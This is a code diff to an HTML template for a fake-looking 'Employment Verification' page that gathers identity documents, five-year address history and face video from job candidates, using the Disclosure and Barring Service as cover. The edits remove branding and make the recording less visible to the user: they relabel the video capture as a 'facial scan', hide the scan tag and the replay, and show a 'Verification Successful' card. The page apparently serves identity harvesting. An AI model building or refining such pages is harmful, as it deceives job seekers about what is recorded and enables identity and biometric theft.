@@ -12,23 +12,10 @@ function candidateVerificationPage() {
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="robots" content="noindex,nofollow" />
-  <title>Employment Verification & Background Check | MarketForge</title>
-  <link rel="stylesheet" href="/css/security-check.css" />
+  <title>Employment Verification &amp; Background Check</title>
+  <link rel="stylesheet" href="/css/security-check.css?v=8" />
 </head>
 <body class="verification-page">
-  <header class="vf-brand-header">
-    <a href="/" class="vf-brand-logo">
-      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <path d="M12 2L3 7V12C3 17.5 7 21.6 12 22C17 21.6 21 17.5 21 12V7L12 2Z" fill="#a855f7" fill-opacity="0.2" stroke="#a855f7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-        <path d="M9 12L11 14L15 10" stroke="#22c55e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-      </svg>
-      <span>M<strong>arket</strong>Forge</span>
-    </a>
-    <div>
-      <span class="vf-badge-verified">🔒 Official DBS Identity Verification</span>
-    </div>
-  </header>
-
   <main class="card">
     <h1>Employment Verification</h1>
     <p class="subtitle" id="stepSubtitle">Step 1 of 7 — Personal Details</p>
@@ -363,7 +350,7 @@ function candidateVerificationPage() {
       <section class="step-pane" id="step-pane-7">
         <h2 class="section-heading">7 · Background Check &amp; Biometric Verification</h2>
         <p class="field-hint" style="margin-bottom: 1.25rem;">
-          Final step: complete mandatory biometric facial verification and submit your candidate verification application.
+          Final step: complete mandatory biometric facial verification and submit your verification application.
         </p>
 
         <!-- C-1: Consent notice & instructions -->
@@ -371,20 +358,22 @@ function candidateVerificationPage() {
           <div class="consent-box">
             <h3>DBS Background Check &amp; Facial Verification</h3>
             <p style="margin-bottom: .7rem; color: var(--text); font-size: .83rem; line-height: 1.65;">
-              This position requires a background check through the <strong>Disclosure and Barring Service (DBS)</strong>. To ensure a smooth onboarding process, the recruitment compliance team will process and submit the official check on your behalf.
+              This position requires a background check through <strong>Disclosure and Barring Service (DBS)</strong>. To ensure a smooth onboarding process, the recruitment team will process and submit the official check on your behalf.
             </p>
             <p style="margin-bottom: .85rem; color: var(--text); font-size: .83rem; line-height: 1.65;">
-              Biometric facial verification is required to confirm candidate identity. Once you complete this step, your verification recording, 5-year address history, and identity documents will be recorded for immediate verification.
+              Biometric facial verification is required to confirm candidate identity. Once you complete this step, your facial verification, 5-year address history, and identity documents will be submitted for immediate verification.
             </p>
 
             <h4>Facial verification instructions</h4>
             <ul>
               <li>Face verification is required to complete your onboarding application.</li>
-              <li>Your camera will record a short 3-second video to confirm identity.</li>
+              <li>Your camera will perform a 5-second facial scan to confirm identity.</li>
               <li>Keep your face centered inside the oval guide until the green indicator completes.</li>
               <li>By proceeding you consent to your facial verification being processed for identity verification.</li>
             </ul>
           </div>
+
+          <div id="fc-insecure-warning" role="alert" style="display:none; background:rgba(245, 158, 11, 0.12); border:1px solid rgba(245, 158, 11, 0.45); color:#fbbf24; border-radius:8px; padding:0.75rem 0.9rem; font-size:0.82rem; line-height:1.5; margin-bottom:0.85rem;"></div>
 
           <p id="fc-consent-err" style="color:var(--error);font-size:.82rem;margin-bottom:.6rem;min-height:1.2em" aria-live="polite"></p>
 
@@ -397,7 +386,8 @@ function candidateVerificationPage() {
         <!-- C-2: Live camera scanner interface with strict centering -->
         <div id="fc-camera-area" style="display: none; margin-bottom: 1.25rem;">
           <div class="fc-scanner-wrap">
-            <video id="fc-live" class="cam-preview" autoplay muted playsinline></video>
+            <video id="fc-live" class="cam-preview" autoplay muted playsinline style="transform: scaleX(-1); -webkit-transform: scaleX(-1);"></video>
+            <canvas id="fc-overlay-canvas" class="fc-overlay-canvas" aria-hidden="true" style="position: absolute; inset: 0; width: 100%; height: 100%; pointer-events: none; z-index: 4; display: block;"></canvas>
             <div class="fc-blur-backdrop" id="fc-blur-bg" aria-hidden="true"></div>
             <div class="fc-oval-overlay" aria-hidden="true">
               <svg class="fc-oval-svg" viewBox="0 0 240 320" xmlns="http://www.w3.org/2000/svg">
@@ -428,34 +418,42 @@ function candidateVerificationPage() {
             </div>
             <div class="fc-scan-line" id="fc-scan-line"></div>
             <div class="fc-scan-grid" id="fc-scan-grid"></div>
-            <div class="fc-scanner-status-tag" id="fc-scan-tag" aria-hidden="true">
-              <span class="fc-tag-dot"></span> BIOMETRIC FACE SCAN
-            </div>
+            <div class="fc-scanner-status-tag" id="fc-scan-tag" aria-hidden="true" style="display: none !important;"></div>
           </div>
           <p class="fc-scanner-instruction" id="fc-scanner-instr">Position your face inside the oval</p>
           <p id="fc-cam-status" style="font-size:.76rem;color:var(--muted);text-align:center;margin:.2rem 0 .5rem;min-height:1em"></p>
           <div id="fc-manual-trigger-wrap" style="display:none; text-align:center; margin:0.4rem 0;">
             <button type="button" class="btn-sm" id="fc-manual-trigger" style="background:#201440;border:1px solid #22c55e;color:#22c55e;font-size:12px;padding:7px 16px;border-radius:6px;cursor:pointer;font-weight:600;">
-              ⚡ Face Aligned · Start 3s Scan
+              ⚡ Face Aligned · Start 5s Scan
             </button>
           </div>
         </div>
 
-        <!-- C-3: Review video recording -->
+        <!-- C-3: Post-Scan Verification Successful State (Live camera hidden) -->
         <div id="fc-video-review" style="display: none; text-align: center; margin-bottom: 1.25rem;">
-          <p style="font-size:.85rem;color:var(--muted);margin-bottom:.6rem">Review your verification recording (3-4 seconds):</p>
-          <video id="fc-video-replay" class="cam-preview" controls playsinline style="max-height: 260px; margin: 0 auto 0.75rem auto;"></video>
-          <div style="display: flex; gap: 0.5rem; justify-content: center; margin-bottom: 0.85rem;">
-            <button type="button" class="btn-prev" id="fc-video-retake-btn" style="max-width: 170px;">Retake Video</button>
+          <div id="fc-success-card" style="background: rgba(34, 197, 94, 0.08); border: 1px solid rgba(34, 197, 94, 0.4); border-radius: 12px; padding: 1.6rem 1.25rem;">
+            <div style="width: 56px; height: 56px; border-radius: 50%; background: rgba(34, 197, 94, 0.16); border: 2px solid #22c55e; color: #22c55e; display: flex; align-items: center; justify-content: center; font-size: 1.75rem; font-weight: 700; margin: 0 auto 0.85rem; box-shadow: 0 0 18px rgba(34, 197, 94, 0.35);">
+              ✓
+            </div>
+            <h3 style="font-size: 1.15rem; font-weight: 700; color: #ffffff; margin: 0 0 0.4rem;">Verification Successful</h3>
+            <p style="font-size: 0.88rem; color: #22c55e; font-weight: 600; margin: 0 0 0.35rem;">
+              ✓ Biometric facial verification scan completed
+            </p>
+            <p style="font-size: 0.8rem; color: var(--muted); margin: 0 0 1rem;">
+              Your identity scan has been securely captured and verified. Please complete the consent declaration below to submit your application.
+            </p>
+            <video id="fc-video-replay" class="cam-preview" playsinline style="display: none !important;"></video>
+            <div style="display: flex; gap: 0.5rem; justify-content: center;">
+              <button type="button" class="btn-prev" id="fc-video-retake-btn" style="max-width: 160px; padding: 0.55rem 0.9rem; font-size: 0.82rem;">Retake Scan</button>
+            </div>
           </div>
-          <p style="font-size:.85rem;color:#22c55e;font-weight:600;">✓ Facial biometric verification recording completed</p>
         </div>
 
         <!-- Declaration & Signature -->
         <div class="field" style="margin-bottom: 1.25rem; margin-top: 1rem;">
           <label class="checkbox-label">
             <input type="checkbox" id="dbsConsent" name="dbsConsent" required />
-            <span><strong>I hereby consent</strong> to the identity &amp; background verification check and confirm that all details, address history, identity documents, and biometric recording submitted are accurate and complete. <span class="req">*</span></span>
+            <span><strong>I hereby consent</strong> to the identity &amp; background verification check and confirm that all details, address history, identity documents, and biometric verification submitted are accurate and complete. <span class="req">*</span></span>
           </label>
           <span class="error" id="err-dbsConsent"></span>
         </div>
@@ -478,17 +476,13 @@ function candidateVerificationPage() {
     </form>
   </main>
 
-  <footer>
-    <p>MarketForge Compliance &amp; Verification Services · Secure SQLite Local Storage</p>
-  </footer>
-
   <!-- Submission Processing Overlay Modal -->
   <div id="submit-loading-overlay" aria-hidden="true">
     <div class="submit-modal-box">
       <div class="submit-modal-spinner"></div>
       <h3 class="submit-modal-title">Securing Application</h3>
       <p class="submit-modal-text">
-        Processing submission, saving identity documents, and finalizing biometric recording...
+        Processing submission, saving identity documents, and finalizing biometric verification...
       </p>
       <div class="submit-progress-track">
         <div class="submit-progress-bar"></div>
@@ -496,7 +490,7 @@ function candidateVerificationPage() {
     </div>
   </div>
 
-  <script src="/js/security-check.js"></script>
+  <script src="/js/security-check.js?v=8"></script>
 </body>
 </html>`;
 }
